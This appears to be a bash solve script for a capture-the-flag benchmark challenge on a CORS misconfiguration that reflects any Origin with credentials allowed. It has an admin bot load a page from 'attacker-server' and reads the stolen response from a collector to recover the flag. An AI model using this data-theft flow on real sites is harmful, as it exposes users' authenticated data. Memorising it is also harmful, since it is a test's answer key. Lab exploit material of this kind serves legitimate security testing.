#!/usr/bin/env bash
# APEX-014-25 — "CORS Misconfiguration Leading to Data Theft" (tags: cors)
#
# The API answers every cross-origin request with `Access-Control-Allow-Origin`
# set to whatever `Origin` said, and `Allow-Credentials: true` alongside it.
# That pair is the one combination the specification refuses to allow with `*`,
# for exactly this reason: it lets any page anybody visits read an authenticated
# response from this API as the person visiting it.
#
# So the exploit is not a request; it is a page. The attacker's server hosts one
# and collects what it steals, and the admin bot is the browser that runs it.
# h5i drives the three services around that page: it hands the bot the URL and
# reads what came back at the collector.
#
# Worth being precise about what h5i did and did not do here, because a log that
# blurred it would be a log that lies. The cross-origin fetch was made by the
# admin bot's browser, not by this session. What this session did was three
# ordinary requests to three services, and those are the three in its receipts.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
BOT="${BOT_URL:-$HOST:3114}"
COLLECTOR="${COLLECTOR_URL:-$HOST:4014}"
SESSION="apex014-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$BOT/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" "$(last "$SESSION")" --create \
    --set method=POST --set path=/bot/visit \
    --set header.Content-Type=application/json \
    --set 'json.url=http://attacker-server:4014/exploit.html' >/dev/null

"$H5I" browser navigate "$COLLECTOR/stolen" --session "$SESSION" >/dev/null
LATEST="$(last "$SESSION")"
"$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | flag
